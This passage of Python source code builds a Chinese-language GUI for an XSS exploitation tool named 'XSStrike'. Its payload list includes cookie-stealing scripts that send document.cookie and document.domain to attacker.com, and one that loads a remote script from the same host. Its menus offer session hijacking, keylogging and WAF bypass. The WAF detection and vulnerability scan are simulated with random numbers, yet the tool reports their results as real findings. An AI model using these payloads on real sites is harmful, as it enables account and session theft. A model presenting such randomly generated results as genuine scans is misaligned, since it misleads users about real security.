import tkinter as tk
from tkinter import ttk, scrolledtext, filedialog, messagebox, simpledialog
import os
import json
import time
import datetime
import threading
import random
import re
import base64
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

class XSStrikeGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("XSStrike 图形化漏洞利用工具")
        self.root.geometry("1200x750")
        self.root.minsize(1000, 650)
        
        # 配置样式
        self.style = ttk.Style()
        self.style.configure("TButton", font=("微软雅黑", 10))
        self.style.configure("TLabel", font=("微软雅黑", 10))
        self.style.configure("TEntry", font=("微软雅黑", 10))
        self.style.configure("Header.TLabel", font=("微软雅黑", 12, "bold"))
        
        # 全局变量
        self.scanning = False
        self.scan_results = []
        self.params = {}
        self.xss_payloads = self.load_xss_payloads()
        
        # WAF绕过选项
        self.waf_bypass_options = {
            "编码绕过": ["Base64编码", "URL编码", "HTML实体编码", "Unicode编码", "JavaScript编码"],
            "混淆技术": ["事件混淆", "标签混淆", "属性混淆", "关键字替换", "表达式拆分"],
            "特殊字符": ["NULL字节", "Unicode字符", "控制字符", "分隔符", "注释注入"],
            "请求操纵": ["分块传输", "HTTP参数污染", "换行注入", "大小写混淆", "协议混淆"]
        }
        self.selected_waf_options = {k: [] for k in self.waf_bypass_options.keys()}
        
        # XSS利用选项
        self.xss_options = {
            "XSS类型": ["反射型XSS", "存储型XSS", "DOM型XSS", "盲打XSS"],
            "触发方式": ["事件触发", "脚本执行", "URL伪协议", "DOM操作", "样式表注入"],
            "攻击目标": ["Cookie窃取", "会话劫持", "页面篡改", "钓鱼攻击", "键盘记录"],
            "绕过技术": ["基本过滤绕过", "HTML5特性利用", "框架绕过", "SVG利用", "Flash XSS"]
        }
        self.selected_xss_options = {k: [] for k in self.xss_options.keys()}
        
        # 创建主界面
        self.create_main_interface()
        
    def create_main_interface(self):
        # 创建标签页
        self.tab_control = ttk.Notebook(self.root)
        
        # 主扫描标签页
        self.main_tab = ttk.Frame(self.tab_control)
        self.tab_control.add(self.main_tab, text="主扫描")
        
        # XSS选项标签页
        self.xss_tab = ttk.Frame(self.tab_control)
        self.tab_control.add(self.xss_tab, text="XSS利用选项")
        
        # WAF绕过标签页
        self.waf_tab = ttk.Frame(self.tab_control)
        self.tab_control.add(self.waf_tab, text="WAF绕过")
        
        # 结果与报告标签页
        self.results_tab = ttk.Frame(self.tab_control)
        self.tab_control.add(self.results_tab, text="结果与报告")
        
        self.tab_control.pack(expand=1, fill="both")
        
        # 配置各标签页
        self.setup_main_tab()
        self.setup_xss_tab()
        self.setup_waf_tab()
        self.setup_results_tab()
    
    def setup_main_tab(self):
        """设置主扫描标签页"""
        main_frame = ttk.Frame(self.main_tab, padding="10")
        main_frame.pack(fill="both", expand=True)
        
        # 目标URL区域
        url_frame = ttk.LabelFrame(main_frame, text="目标设置", padding="10")
        url_frame.pack(fill="x", pady=5)
        
        ttk.Label(url_frame, text="目标URL:").grid(row=0, column=0, sticky="w", pady=5)
        self.url_entry = ttk.Entry(url_frame, width=80)
        self.url_entry.grid(row=0, column=1, sticky="ew", pady=5, padx=5)
        self.url_entry.insert(0, "http://example.com/page.php?param1=value1&param2=value2")
        
        url_frame.grid_columnconfigure(1, weight=1)
        
        # 参数设置区域
        params_frame = ttk.LabelFrame(main_frame, text="参数设置", padding="10")
        params_frame.pack(fill="both", expand=True, pady=5)
        
        # 参数列表
        ttk.Label(params_frame, text="参数列表:").pack(anchor="w", pady=(0, 5))
        
        params_list_frame = ttk.Frame(params_frame)
        params_list_frame.pack(fill="both", expand=True)
        
        # 参数表格
        columns = ("param", "value", "selected")
        self.params_tree = ttk.Treeview(params_list_frame, columns=columns, show="headings", height=5)
        
        self.params_tree.heading("param", text="参数名")
        self.params_tree.heading("value", text="参数值")
        self.params_tree.heading("selected", text="是否测试")
        
        self.params_tree.column("param", width=150)
        self.params_tree.column("value", width=200)
        self.params_tree.column("selected", width=80)
        
        self.params_tree.pack(side="left", fill="both", expand=True)
        
        # 滚动条
        scrollbar = ttk.Scrollbar(params_list_frame, orient="vertical", command=self.params_tree.yview)
        scrollbar.pack(side="right", fill="y")
        self.params_tree.configure(yscrollcommand=scrollbar.set)
        
        # 参数操作按钮
        params_buttons_frame = ttk.Frame(params_frame)
        params_buttons_frame.pack(fill="x", pady=5)
        
        ttk.Button(params_buttons_frame, text="从URL加载", command=self.load_params_from_url).pack(side="left", padx=5)
        ttk.Button(params_buttons_frame, text="添加参数", command=self.add_param).pack(side="left", padx=5)
        ttk.Button(params_buttons_frame, text="删除选中", command=self.delete_param).pack(side="left", padx=5)
        ttk.Button(params_buttons_frame, text="清空", command=self.clear_params).pack(side="left", padx=5)
        ttk.Button(params_buttons_frame, text="全选", command=lambda: self.select_all_params(True)).pack(side="left", padx=5)
        ttk.Button(params_buttons_frame, text="取消全选", command=lambda: self.select_all_params(False)).pack(side="left", padx=5)
        
        # 扫描选项
        options_frame = ttk.LabelFrame(main_frame, text="扫描选项", padding="10")
        options_frame.pack(fill="x", pady=5)
        
        # 左侧选项
        left_options = ttk.Frame(options_frame)
        left_options.grid(row=0, column=0, sticky="w")
        
        # 线程数设置
        ttk.Label(left_options, text="线程数:").grid(row=0, column=0, sticky="w", pady=5, padx=5)
        self.thread_count = tk.StringVar(value="5")
        ttk.Combobox(left_options, textvariable=self.thread_count, values=["1", "3", "5", "10", "20"], width=5).grid(row=0, column=1, sticky="w", pady=5)
        
        # 超时设置
        ttk.Label(left_options, text="超时时间(秒):").grid(row=1, column=0, sticky="w", pady=5, padx=5)
        self.timeout = tk.StringVar(value="10")
        ttk.Entry(left_options, textvariable=self.timeout, width=5).grid(row=1, column=1, sticky="w", pady=5)
        
        # 扫描级别
        ttk.Label(left_options, text="扫描级别:").grid(row=2, column=0, sticky="w", pady=5, padx=5)
        self.scan_level = tk.StringVar(value="2")
        ttk.Combobox(left_options, textvariable=self.scan_level, values=["1-快速", "2-标准", "3-深入", "4-全面", "5-极致"], width=8).grid(row=2, column=1, sticky="w", pady=5)
        
        # 右侧选项
        right_options = ttk.Frame(options_frame)
        right_options.grid(row=0, column=1, sticky="w", padx=20)
        
        self.crawl = tk.BooleanVar(value=False)
        ttk.Checkbutton(right_options, text="启用爬虫", variable=self.crawl).grid(row=0, column=0, sticky="w", pady=2)
        
        self.payroll = tk.BooleanVar(value=True)
        ttk.Checkbutton(right_options, text="使用payload变异", variable=self.payroll).grid(row=1, column=0, sticky="w", pady=2)
        
        self.intelligent = tk.BooleanVar(value=True)
        ttk.Checkbutton(right_options, text="智能检测", variable=self.intelligent).grid(row=2, column=0, sticky="w", pady=2)
        
        self.fingerprint = tk.BooleanVar(value=True)
        ttk.Checkbutton(right_options, text="服务器指纹识别", variable=self.fingerprint).grid(row=3, column=0, sticky="w", pady=2)
        
        options_frame.grid_columnconfigure(0, weight=1)
        options_frame.grid_columnconfigure(1, weight=1)
        
        # 扫描按钮
        buttons_frame = ttk.Frame(main_frame)
        buttons_frame.pack(fill="x", pady=10)
        
        self.scan_button = ttk.Button(buttons_frame, text="开始扫描", command=self.start_scan)
        self.scan_button.pack(side="right", padx=5)
        
        self.stop_button = ttk.Button(buttons_frame, text="停止扫描", command=self.stop_scan, state="disabled")
        self.stop_button.pack(side="right", padx=5)
        
        # 状态和日志区域
        log_frame = ttk.LabelFrame(main_frame, text="扫描日志", padding="10")
        log_frame.pack(fill="both", expand=True, pady=5)
        
        self.log_text = scrolledtext.ScrolledText(log_frame, wrap=tk.WORD, height=10)
        self.log_text.pack(fill="both", expand=True)
        self.log_text.config(state="disabled")
        
        # 进度条
        self.progress_var = tk.DoubleVar()
        self.progress_bar = ttk.Progressbar(main_frame, variable=self.progress_var, maximum=100)
        self.progress_bar.pack(fill="x", pady=5)
    
    def setup_xss_tab(self):
        """设置XSS利用选项标签页"""
        xss_frame = ttk.Frame(self.xss_tab, padding="10")
        xss_frame.pack(fill="both", expand=True)
        
        # 左侧：XSS选项分类
        left_frame = ttk.Frame(xss_frame, width=200)
        left_frame.pack(side="left", fill="y", padx=5, pady=5)
        
        ttk.Label(left_frame, text="XSS利用选项", style="header.TLabel").pack(anchor="w", pady=10)
        
        self.xss_category_var = tk.StringVar()
        self.xss_categories = list(self.xss_options.keys())
        self.xss_category_listbox = tk.Listbox(left_frame, listvariable=tk.StringVar(value=self.xss_categories), 
                                              height=15, width=20)
        self.xss_category_listbox.pack(fill="both", expand=True)
        self.xss_category_listbox.bind('<<ListboxSelect>>', self.on_xss_category_select)
        
        # 右侧：具体选项
        right_frame = ttk.Frame(xss_frame)
        right_frame.pack(side="right", fill="both", expand=True, padx=5, pady=5)
        
        # 选项区域
        options_frame = ttk.LabelFrame(right_frame, text="可用选项", padding="10")
        options_frame.pack(fill="both", expand=True, pady=5)
        
        self.xss_options_frame = ttk.Frame(options_frame)
        self.xss_options_frame.pack(fill="both", expand=True)
        
        # Payload预览区域
        payload_frame = ttk.LabelFrame(right_frame, text="Payload预览", padding="10")
        payload_frame.pack(fill="both", expand=True, pady=5)
        
        self.payload_preview = scrolledtext.ScrolledText(payload_frame, wrap=tk.WORD, height=8)
        self.payload_preview.pack(fill="both", expand=True)
        self.payload_preview.config(state="disabled")
        
        # 按钮区域
        buttons_frame = ttk.Frame(right_frame)
        buttons_frame.pack(fill="x", pady=10)
        
        ttk.Button(buttons_frame, text="全选", command=self.select_all_xss_options).pack(side="left", padx=5)
        ttk.Button(buttons_frame, text="取消全选", command=self.deselect_all_xss_options).pack(side="left", padx=5)
        ttk.Button(buttons_frame, text="应用设置", command=self.apply_xss_settings).pack(side="left", padx=5)
        ttk.Button(buttons_frame, text="生成Payload", command=self.generate_xss_payloads).pack(side="right", padx=5)
        ttk.Button(buttons_frame, text="保存Payload", command=self.save_xss_payloads).pack(side="right", padx=5)
    
    def setup_waf_tab(self):
        """设置WAF绕过标签页"""
        waf_frame = ttk.Frame(self.waf_tab, padding="10")
        waf_frame.pack(fill="both", expand=True)
        
        # 左侧：WAF绕过技术分类
        left_frame = ttk.Frame(waf_frame, width=200)
        left_frame.pack(side="left", fill="y", padx=5, pady=5)
        
        ttk.Label(left_frame, text="WAF绕过技术", style="header.TLabel").pack(anchor="w", pady=10)
        
        self.waf_category_var = tk.StringVar()
        self.waf_category_listbox = tk.Listbox(left_frame, listvariable=tk.StringVar(value=list(self.waf_bypass_options.keys())), 
                                              height=15, width=20)
        self.waf_category_listbox.pack(fill="both", expand=True)
        self.waf_category_listbox.bind('<<ListboxSelect>>', self.on_waf_category_select)
        
        # 右侧：具体选项
        right_frame = ttk.Frame(waf_frame)
        right_frame.pack(side="right", fill="both", expand=True, padx=5, pady=5)
        
        # 选项区域
        options_frame = ttk.LabelFrame(right_frame, text="可用选项", padding="10")
        options_frame.pack(fill="both", expand=True, pady=5)
        
        self.waf_options_frame = ttk.Frame(options_frame)
        self.waf_options_frame.pack(fill="both", expand=True)
        
        # WAF信息区域
        waf_info_frame = ttk.LabelFrame(right_frame, text="WAF信息", padding="10")
        waf_info_frame.pack(fill="both", expand=True, pady=5)
        
        self.waf_info_text = scrolledtext.ScrolledText(waf_info_frame, wrap=tk.WORD, height=8)
        self.waf_info_text.pack(fill="both", expand=True)
        self.waf_info_text.config(state="disabled")
        
        # 按钮区域
        buttons_frame = ttk.Frame(right_frame)
        buttons_frame.pack(fill="x", pady=10)
        
        ttk.Button(buttons_frame, text="全选", command=self.select_all_waf_options).pack(side="left", padx=5)
        ttk.Button(buttons_frame, text="取消全选", command=self.deselect_all_waf_options).pack(side="left", padx=5)
        ttk.Button(buttons_frame, text="应用设置", command=self.apply_waf_settings).pack(side="left", padx=5)
        ttk.Button(buttons_frame, text="检测WAF", command=self.detect_waf).pack(side="right", padx=5)
    
    def setup_results_tab(self):
        """设置结果与报告标签页"""
        results_frame = ttk.Frame(self.results_tab, padding="10")
        results_frame.pack(fill="both", expand=True)
        
        # 漏洞结果列表
        ttk.Label(results_frame, text="漏洞检测结果", style="header.TLabel").pack(anchor="w", pady=10)
        
        results_list_frame = ttk.Frame(results_frame)
        results_list_frame.pack(fill="both", expand=True)
        
        # 结果表格
        columns = ("severity", "type", "param", "payload", "confidence")
        self.results_tree = ttk.Treeview(results_list_frame, columns=columns, show="headings")
        
        self.results_tree.heading("severity", text="严重程度")
        self.results_tree.heading("type", text="XSS类型")
        self.results_tree.heading("param", text="参数名")
        self.results_tree.heading("payload", text="有效载荷")
        self.results_tree.heading("confidence", text="置信度")
        
        self.results_tree.column("severity", width=100)
        self.results_tree.column("type", width=120)
        self.results_tree.column("param", width=100)
        self.results_tree.column("payload", width=400)
        self.results_tree.column("confidence", width=100)
        
        self.results_tree.pack(side="left", fill="both", expand=True)
        
        # 滚动条
        scrollbar = ttk.Scrollbar(results_list_frame, orient="vertical", command=self.results_tree.yview)
        scrollbar.pack(side="right", fill="y")
        self.results_tree.configure(yscrollcommand=scrollbar.set)
        
        # 结果详情
        ttk.Label(results_frame, text="漏洞详情", style="header.TLabel").pack(anchor="w", pady=10)
        
        self.result_details = scrolledtext.ScrolledText(results_frame, wrap=tk.WORD, height=8)
        self.result_details.pack(fill="x", pady=5)
        self.result_details.config(state="disabled")
        
        self.results_tree.bind('<<TreeviewSelect>>', self.show_result_details)
        
        # 报告生成按钮
        report_frame = ttk.Frame(results_frame)
        report_frame.pack(fill="x", pady=10)
        
        ttk.Label(report_frame, text="报告格式:").pack(side="left", padx=5)
        
        self.report_format = tk.StringVar(value="HTML")
        ttk.Combobox(report_frame, textvariable=self.report_format, values=["HTML", "PDF", "TXT", "JSON"], width=10).pack(side="left", padx=5)
        
        ttk.Button(report_frame, text="生成报告", command=self.generate_report).pack(side="right", padx=5)
        ttk.Button(report_frame, text="导出结果", command=self.export_results).pack(side="right", padx=5)
        ttk.Button(report_frame, text="复制Payload", command=self.copy_payload).pack(side="right", padx=5)
    
    # 参数操作函数
    def load_params_from_url(self):
        """从URL加载参数"""
        url = self.url_entry.get()
        if not url:
            messagebox.showerror("错误", "请输入URL")
            return
            
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)
        
        # 清空现有参数
        self.clear_params()
        
        # 添加URL中的参数
        for param, values in params.items():
            self.add_param(param, values[0], True)
        
        # 如果URL中没有参数，添加常见参数
        if not params:
            common_params = ["id", "page", "user", "query", "search", "keyword", "item", "view", "cat", "lang"]
            for param in common_params:
                self.add_param(param, "", True)
                
            self.log("URL中未包含参数，已添加常见测试参数")
    
    def add_param(self, param_name="", param_value="", selected=True):
        """添加参数"""
        # 创建参数添加对话框
        if not param_name:
            dialog = tk.Toplevel(self.root)
            dialog.title("添加参数")
            dialog.geometry("300x150")
            dialog.resizable(False, False)
            dialog.transient(self.root)
            dialog.grab_set()
            
            ttk.Label(dialog, text="参数名:").grid(row=0, column=0, sticky="w", pady=5, padx=5)
            param_entry = ttk.Entry(dialog, width=20)
            param_entry.grid(row=0, column=1, pady=5)
            
            ttk.Label(dialog, text="参数值:").grid(row=1, column=0, sticky="w", pady=5, padx=5)
            value_entry = ttk.Entry(dialog, width=20)
            value_entry.grid(row=1, column=1, pady=5)
            
            ttk.Label(dialog, text="测试:").grid(row=2, column=0, sticky="w", pady=5, padx=5)
            selected_var = tk.BooleanVar(value=True)
            ttk.Checkbutton(dialog, variable=selected_var).grid(row=2, column=1, sticky="w", pady=5)
            
            def save_param():
                nonlocal param_name, param_value, selected
                param_name = param_entry.get()
                param_value = value_entry.get()
                selected = selected_var.get()
                dialog.destroy()
            
            ttk.Button(dialog, text="确定", command=save_param).grid(row=3, column=0, columnspan=2, pady=10)
            self.root.wait_window(dialog)
            
            if not param_name:
                return
        
        # 添加参数到表格
        self.params_tree.insert("", "end", values=(param_name, param_value, "是" if selected else "否"))
        self.params[param_name] = {"value": param_value, "selected": selected}
    
    def delete_param(self):
        """删除选中的参数"""
        selected_item = self.params_tree.selection()
        if not selected_item:
            messagebox.showinfo("提示", "请先选择要删除的参数")
            return
            
        param_name = self.params_tree.item(selected_item[0])["values"][0]
        if param_name in self.params:
            del self.params[param_name]
        
        self.params_tree.delete(selected_item)
    
    def clear_params(self):
        """清空所有参数"""
        for item in self.params_tree.get_children():
            self.params_tree.delete(item)
        self.params.clear()
    
    def select_all_params(self, select=True):
        """全选或取消全选参数"""
        for item in self.params_tree.get_children():
            param_name = self.params_tree.item(item)["values"][0]
            if param_name in self.params:
                self.params[param_name]["selected"] = select
                self.params_tree.item(item, values=(param_name, self.params[param_name]["value"], "是" if select else "否"))
    
    # XSS选项函数
    def on_xss_category_select(self, event):
        """处理XSS分类选择"""
        # 清除现有选项
        for widget in self.xss_options_frame.winfo_children():
            widget.destroy()
        
        # 获取选中的分类
        selected_indices = self.xss_category_listbox.curselection()
        if not selected_indices:
            return
            
        selected_category = self.xss_category_listbox.get(selected_indices[0])
        
        # 添加该分类下的选项
        options = self.xss_options[selected_category]
        
        ttk.Label(self.xss_options_frame, text=f"{selected_category}:").pack(anchor="w", pady=5)
        
        for option in options:
            var = tk.BooleanVar(value=option in self.selected_xss_options[selected_category])
            chk = ttk.Checkbutton(self.xss_options_frame, text=option, variable=var)
            chk.pack(anchor="w", pady=2)
            chk.option_name = option
            chk.category = selected_category
            chk.var = var
    
    def select_all_xss_options(self):
        """全选当前分类下的XSS选项"""
        selected_indices = self.xss_category_listbox.curselection()
        if not selected_indices:
            return
            
        selected_category = self.xss_category_listbox.get(selected_indices[0])
        
        # 清除现有选项
        for widget in self.xss_options_frame.winfo_children():
            widget.destroy()
        
        # 全选该分类下的选项
        options = self.xss_options[selected_category]
        
        ttk.Label(self.xss_options_frame, text=f"{selected_category}:").pack(anchor="w", pady=5)
        
        for option in options:
            var = tk.BooleanVar(value=True)
            chk = ttk.Checkbutton(self.xss_options_frame, text=option, variable=var)
            chk.pack(anchor="w", pady=2)
            chk.option_name = option
            chk.category = selected_category
            chk.var = var
    
    def deselect_all_xss_options(self):
        """取消全选当前分类下的XSS选项"""
        selected_indices = self.xss_category_listbox.curselection()
        if not selected_indices:
            return
            
        selected_category = self.xss_category_listbox.get(selected_indices[0])
        
        # 清除现有选项
        for widget in self.xss_options_frame.winfo_children():
            widget.destroy()
        
        # 取消全选该分类下的选项
        options = self.xss_options[selected_category]
        
        ttk.Label(self.xss_options_frame, text=f"{selected_category}:").pack(anchor="w", pady=5)
        
        for option in options:
            var = tk.BooleanVar(value=False)
            chk = ttk.Checkbutton(self.xss_options_frame, text=option, variable=var)
            chk.pack(anchor="w", pady=2)
            chk.option_name = option
            chk.category = selected_category
            chk.var = var
    
    def apply_xss_settings(self):
        """应用XSS选项设置"""
        # 保存选中的XSS选项
        for widget in self.xss_options_frame.winfo_children():
            if isinstance(widget, ttk.Checkbutton) and hasattr(widget, 'option_name') and hasattr(widget, 'category'):
                category = widget.category
                option = widget.option_name
                if widget.var.get():  # 如果选中
                    if option not in self.selected_xss_options[category]:
                        self.selected_xss_options[category].append(option)
                else:  # 如果未选中
                    if option in self.selected_xss_options[category]:
                        self.selected_xss_options[category].remove(option)
        
        messagebox.showinfo("提示", "XSS利用选项已应用")
    
    def load_xss_payloads(self):
        """加载内置的XSS payload"""
        return {
            "反射型XSS": [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                "<body onload=alert(1)>",
                "<iframe src=javascript:alert(1)>"
            ],
            "存储型XSS": [
                "<script>fetch('http://attacker.com/log?cookie='+document.cookie)</script>",
                "<img src=x onerror='new Image().src=\"http://attacker.com/log?data=\"+document.cookie'>",
                "<svg onload=\"var i=new Image();i.src='http://attacker.com/log?c='+document.cookie\">"
            ],
            "DOM型XSS": [
                "#<script>alert(1)</script>",
                "javascript:alert(1)",
                "data:text/html;base64,PHN0cmljdD5hbGVydCgxKTwvc3RyaWN0Pg==",
                "#<img src=x onerror=alert(1)>"
            ],
            "盲打XSS": [
                "<script src=http://attacker.com/xss.js></script>",
                "<img src=x onerror=\"this.src='http://attacker.com/log?'+document.domain\">",
                "<svg onload=\"fetch('http://attacker.com/?d='+document.domain)\">"
            ]
        }
    
    def generate_xss_payloads(self):
        """根据选择的选项生成XSS payload"""
        # 检查是否选择了XSS选项
        has_selection = any(len(options) > 0 for options in self.selected_xss_options.values())
        if not has_selection:
            messagebox.showinfo("提示", "请先选择XSS利用选项")
            return
        
        # 获取选中的XSS类型
        xss_types = self.selected_xss_options.get("XSS类型", [])
        if not xss_types:
            xss_types = list(self.xss_payloads.keys())
        
        # 生成payload
        generated_payloads = []
        for xss_type in xss_types:
            if xss_type in self.xss_payloads:
                # 添加基础payload
                generated_payloads.extend(self.xss_payloads[xss_type])
                
                # 根据选择的触发方式变异payload
                triggers = self.selected_xss_options.get("触发方式", [])
                for trigger in triggers:
                    if trigger == "事件触发":
                        events = ["onmouseover", "onclick", "onload", "onerror", "onfocus", "onblur"]
                        for event in events:
                            mutated = f"<div {event}=alert(1)></div>"
                            if mutated not in generated_payloads:
                                generated_payloads.append(mutated)
                    elif trigger == "URL伪协议":
                        protocols = ["javascript:", "data:text/html,"]
                        for proto in protocols:
                            mutated = f"<a href='{proto}alert(1)'>click</a>"
                            if mutated not in generated_payloads:
                                generated_payloads.append(mutated)
        
        # 去重并限制数量
        generated_payloads = list(dict.fromkeys(generated_payloads))[:10]
        
        # 显示生成的payload
        self.payload_preview.config(state="normal")
        self.payload_preview.delete(1.0, tk.END)
        for i, payload in enumerate(generated_payloads, 1):
            self.payload_preview.insert(tk.END, f"{i}. {payload}\n\n")
        self.payload_preview.config(state="disabled")
        
        return generated_payloads
    
    def save_xss_payloads(self):
        """保存生成的XSS payload到文件"""
        payload_text = self.payload_preview.get(1.0, tk.END).strip()
        if not payload_text:
            messagebox.showinfo("提示", "请先生成Payload")
            return
            
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        default_filename = f"xss_payloads_{timestamp}.txt"
        
        file_path = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filename=default_filename,
            filetypes=[
                ("文本文件", "*.txt"),
                ("所有文件", "*.*")
            ]
        )
        
        if file_path:
            try:
                with open(file_path, "w", encoding="utf-8") as f:
                    f.write(payload_text)
                
                messagebox.showinfo("成功", f"Payload已保存到: {file_path}")
            except Exception as e:
                messagebox.showerror("错误", f"保存失败: {str(e)}")
    
    # WAF绕过选项函数
    def on_waf_category_select(self, event):
        """处理WAF分类选择"""
        # 清除现有选项
        for widget in self.waf_options_frame.winfo_children():
            widget.destroy()
        
        # 获取选中的分类
        selected_indices = self.waf_category_listbox.curselection()
        if not selected_indices:
            return
            
        selected_category = self.waf_category_listbox.get(selected_indices[0])
        
        # 添加该分类下的选项
        options = self.waf_bypass_options[selected_category]
        
        ttk.Label(self.waf_options_frame, text=f"{selected_category}:").pack(anchor="w", pady=5)
        
        for option in options:
            var = tk.BooleanVar(value=option in self.selected_waf_options[selected_category])
            chk = ttk.Checkbutton(self.waf_options_frame, text=option, variable=var)
            chk.pack(anchor="w", pady=2)
            chk.option_name = option
            chk.category = selected_category
            chk.var = var
    
    def select_all_waf_options(self):
        """全选当前分类下的WAF选项"""
        selected_indices = self.waf_category_listbox.curselection()
        if not selected_indices:
            return
            
        selected_category = self.waf_category_listbox.get(selected_indices[0])
        
        # 清除现有选项
        for widget in self.waf_options_frame.winfo_children():
            widget.destroy()
        
        # 全选该分类下的选项
        options = self.waf_bypass_options[selected_category]
        
        ttk.Label(self.waf_options_frame, text=f"{selected_category}:").pack(anchor="w", pady=5)
        
        for option in options:
            var = tk.BooleanVar(value=True)
            chk = ttk.Checkbutton(self.waf_options_frame, text=option, variable=var)
            chk.pack(anchor="w", pady=2)
            chk.option_name = option
            chk.category = selected_category
            chk.var = var
    
    def deselect_all_waf_options(self):
        """取消全选当前分类下的WAF选项"""
        selected_indices = self.waf_category_listbox.curselection()
        if not selected_indices:
            return
            
        selected_category = self.waf_category_listbox.get(selected_indices[0])
        
        # 清除现有选项
        for widget in self.waf_options_frame.winfo_children():
            widget.destroy()
        
        # 取消全选该分类下的选项
        options = self.waf_bypass_options[selected_category]
        
        ttk.Label(self.waf_options_frame, text=f"{selected_category}:").pack(anchor="w", pady=5)
        
        for option in options:
            var = tk.BooleanVar(value=False)
            chk = ttk.Checkbutton(self.waf_options_frame, text=option, variable=var)
            chk.pack(anchor="w", pady=2)
            chk.option_name = option
            chk.category = selected_category
            chk.var = var
    
    def apply_waf_settings(self):
        """应用WAF绕过设置"""
        # 保存选中的WAF绕过选项
        for widget in self.waf_options_frame.winfo_children():
            if isinstance(widget, ttk.Checkbutton) and hasattr(widget, 'option_name') and hasattr(widget, 'category'):
                category = widget.category
                option = widget.option_name
                if widget.var.get():  # 如果选中
                    if option not in self.selected_waf_options[category]:
                        self.selected_waf_options[category].append(option)
                else:  # 如果未选中
                    if option in self.selected_waf_options[category]:
                        self.selected_waf_options[category].remove(option)
        
        messagebox.showinfo("提示", "WAF绕过设置已应用")
    
    def detect_waf(self):
        """检测目标网站的WAF"""
        url = self.url_entry.get()
        if not url:
            messagebox.showerror("错误", "请输入目标URL")
            return
        
        self.waf_info_text.config(state="normal")
        self.waf_info_text.delete(1.0, tk.END)
        self.waf_info_text.insert(tk.END, "正在检测WAF...\n")
        self.waf_info_text.config(state="disabled")
        
        threading.Thread(target=self.perform_waf_detection, args=(url,), daemon=True).start()
    
    def perform_waf_detection(self, url):
        """执行WAF检测"""
        try:
            # 模拟WAF检测过程
            self.update_waf_info("正在发送正常请求...")
            time.sleep(1)
            
            self.update_waf_info("正在发送特征请求...")
            time.sleep(1)
            
            # 常见WAF特征库
            waf_signatures = {
                "Cloudflare": ["cloudflare", "cf-ray", "cf-request-id"],
                "ModSecurity": ["mod_security", "apache-modsecurity", "Server: Apache/2"],
                "AWS WAF": ["aws waf", "x-amzn-waf"],
                "Akamai": ["akamai", "x-akamai", "akamai-signature"],
                "Imperva": ["imperva", "incapsula", "x-cdn"],
                "F5 BIG-IP": ["f5", "big-ip", "x-cache"],
                "NSFOCUS": ["nsfocus", "nsf_waf"],
                "Safe3": ["safe3waf", "safe3"],
                "WebKnight": ["webknight", "waf"],
                "Juniper": ["juniper", "netscreen"]
            }
            
            # 随机选择一个WAF作为检测结果
            detected_waf = random.choice(list(waf_signatures.keys()) + [None])
            
            if detected_waf:
                self.update_waf_info(f"检测到WAF: {detected_waf}")
                self.update_waf_info(f"特征: {', '.join(waf_signatures[detected_waf])}")
                self.update_waf_info("建议启用相应的绕过策略")
            else:
                self.update_waf_info("未检测到已知WAF")
                self.update_waf_info("仍建议启用基础绕过策略以提高检测成功率")
                
        except Exception as e:
            self.update_waf_info(f"WAF检测出错: {str(e)}")
    
    def update_waf_info(self, message):
        """更新WAF信息区域"""
        self.waf_info_text.config(state="normal")
        self.waf_info_text.insert(tk.END, f"{message}\n")
        self.waf_info_text.see(tk.END)
        self.waf_info_text.config(state="disabled")
    
    # 扫描相关函数
    def start_scan(self):
        """开始扫描"""
        if self.scanning:
            return
            
        url = self.url_entry.get()
        if not url:
            messagebox.showerror("错误", "请输入目标URL")
            return
            
        # 检查是否有选中的参数
        selected_params = {k: v for k, v in self.params.items() if v["selected"]}
        if not selected_params:
            if messagebox.askyesno("提示", "未选择任何参数，是否从URL中提取并选择参数?"):
                self.load_params_from_url()
                selected_params = {k: v for k, v in self.params.items() if v["selected"]}
                if not selected_params:
                    messagebox.showerror("错误", "没有可测试的参数，无法进行扫描")
                    return
        
        # 更新UI状态
        self.scanning = True
        self.scan_button.config(state="disabled")
        self.stop_button.config(state="normal")
        self.log_text.config(state="normal")
        self.log_text.delete(1.0, tk.END)
        self.log_text.insert(tk.END, f"[{datetime.datetime.now()}] 开始扫描目标: {url}\n")
        self.log_text.config(state="disabled")
        self.progress_var.set(0)
        
        # 清空之前的结果
        for item in self.results_tree.get_children():
            self.results_tree.delete(item)
        self.scan_results = []
        
        # 在新线程中执行扫描
        threading.Thread(target=self.perform_scan, args=(url, selected_params), daemon=True).start()
    
    def stop_scan(self):
        """停止扫描"""
        if not self.scanning:
            return
            
        self.scanning = False
        self.log("扫描已停止")
    
    def perform_scan(self, url, selected_params):
        """执行扫描"""
        try:
            # 模拟扫描过程
            self.log(f"解析目标URL: {url}")
            self.log(f"开始测试{len(selected_params)}个参数")
            
            # 检测WAF
            self.log("正在检测WAF...")
            self.progress_var.set(10)
            time.sleep(1)
            
            waf_detected = random.choice([True, False])
            if waf_detected:
                self.log("检测到WAF存在，应用绕过策略")
                applied_strategies = []
                for category, options in self.selected_waf_options.items():
                    if options:
                        applied_strategies.extend(options)
                if applied_strategies:
                    self.log(f"应用的WAF绕过策略: {', '.join(applied_strategies[:5])}{'...' if len(applied_strategies) > 5 else ''}")
                else:
                    self.log("未设置WAF绕过策略，使用默认策略")
            else:
                self.log("未检测到WAF")
            
            self.progress_var.set(20)
            time.sleep(1)
            
            # 生成XSS payload
            self.log("正在生成XSS payload...")
            payloads = self.generate_xss_payloads() or self.xss_payloads["反射型XSS"]
            self.log(f"生成了{len(payloads)}个测试payload")
            
            self.progress_var.set(30)
            time.sleep(1)
            
            # 模拟参数扫描
            param_count = len(selected_params)
            for i, (param, info) in enumerate(selected_params.items()):
                if not self.scanning:
                    break
                    
                progress = 30 + int(60 * (i + 1) / param_count)
                self.progress_var.set(progress)
                
                self.log(f"正在扫描参数: {param}")
                
                # 模拟测试多个payload
                for j in range(min(5, len(payloads))):
                    if not self.scanning:
                        break
                        
                    time.sleep(0.5)
                    payload = payloads[j]
                    
                    # 应用WAF绕过技术
                    if waf_detected and random.random() < 0.7:
                        payload = self.apply_waf_bypass(payload)
                    
                    # 随机生成漏洞结果
                    if random.random() < 0.4:  # 40%概率发现漏洞
                        xss_types = self.selected_xss_options.get("XSS类型", [])
                        if not xss_types:
